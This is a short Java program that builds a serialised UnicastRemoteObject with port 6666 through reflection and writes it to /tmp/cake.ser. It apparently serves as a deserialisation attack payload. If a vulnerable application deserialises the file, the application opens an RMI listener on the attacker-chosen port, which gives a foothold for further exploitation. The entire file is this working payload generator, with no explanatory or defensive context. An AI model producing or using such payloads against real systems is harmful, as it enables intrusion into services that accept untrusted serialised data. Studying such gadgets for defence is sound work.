import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.UnicastRemoteObject;
import java.lang.reflect.Constructor;
import java.io.Serializable;

public class SerializeUROExample {

    public static void main(String[] args) throws Exception {
           FileOutputStream fileOut =
           new FileOutputStream("/tmp/cake.ser");
           ObjectOutputStream out =
                   new ObjectOutputStream(fileOut);
           out.writeObject(createObject(6666));
           out.close();
           fileOut.close();
    }

    public static Serializable createObject(int port) throws Exception{
            Constructor<UnicastRemoteObject> constructor =
                    UnicastRemoteObject.class.getDeclaredConstructor(int.class);
            constructor.setAccessible(true);
            return (UnicastRemoteObject) constructor.newInstance(port);
     }
}
